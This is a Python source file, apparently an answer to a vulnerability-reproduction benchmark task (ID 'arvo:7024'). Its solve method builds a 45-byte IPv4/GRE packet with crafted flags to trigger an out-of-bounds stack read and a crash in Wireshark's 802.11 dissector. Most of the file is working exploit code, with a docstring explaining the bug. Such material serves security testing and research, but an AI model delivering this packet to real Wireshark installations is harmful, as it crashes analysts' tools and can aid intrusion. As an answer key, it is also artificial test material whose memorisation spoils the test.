import socket
import struct

class Solution:
    """
    Generates a PoC for a Stack Buffer Overflow in the Wireshark 802.11 dissector.
    Vulnerability ID: arvo:7024
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a 45-byte PoC that triggers an out-of-bounds read on the stack.

        The vulnerability exists in the handling of GRE-encapsulated 802.11 frames.
        The GRE dissector passes its 'flags and version' field to the 802.11
        subdissector. The 802.11 dissector, when handling a specific encapsulation
        type triggered by GRE Protocol Type 0x880B (ERF), misinterprets these
        flags.

        A 4-bit value `phy_mode` is extracted from the GRE flags. This value is then
        used as an index into a 5-element array on the stack (`dot11_phy_modes`)
        without proper bounds checking. By setting the flags to 0x00F0, we force
        `phy_mode` to be 15, causing a read far beyond the array's bounds. This
        reads a garbage pointer value from the stack, which is then used in an
        `snprintf` call, leading to a crash (segmentation fault). This type of crash,
        originating from corrupted stack data, is often categorized as a stack-based
        vulnerability.

        The PoC consists of:
        - A 20-byte IPv4 header, encapsulating a GRE packet.
        - A 4-byte GRE header with the malicious flags (0x00F0) and the
          triggering protocol type (0x880B).
        - A 21-byte payload containing a minimal 802.11 frame to ensure the
          dissector reaches the vulnerable code path.
        """

        # IP Header (20 bytes)
        # Total Length = 45 bytes, Protocol = 47 (GRE)
        ip_header = (
            b'\x45\x00\x00\x2d'  # Version, IHL, ToS, Total Length
            b'\x00\x01\x40\x00'  # Identification, Flags (DF), Fragment Offset
            b'\x40\x2f\x81\x9f'  # TTL, Protocol (GRE), Header Checksum
            b'\x7f\x00\x00\x01'  # Source IP: 127.0.0.1
            b'\x7f\x00\x00\x01'  # Destination IP: 127.0.0.1
        )

        # GRE Header (4 bytes)
        # Flags and Version = 0x00F0 -> results in phy_mode = 15
        # Protocol Type = 0x880B -> triggers 802.11 dissector for ERF
        gre_header = b'\x00\xf0\x88\x0b'

        # Payload (21 bytes)
        # Minimal 802.11 Data frame (FCF = 0x0800) + padding
        payload = b'\x08\x00' + b'\x00' * 19

        poc = ip_header + gre_header + payload
        
        # Ensure final length is exactly 45 bytes
        assert len(poc) == 45
        
        return poc
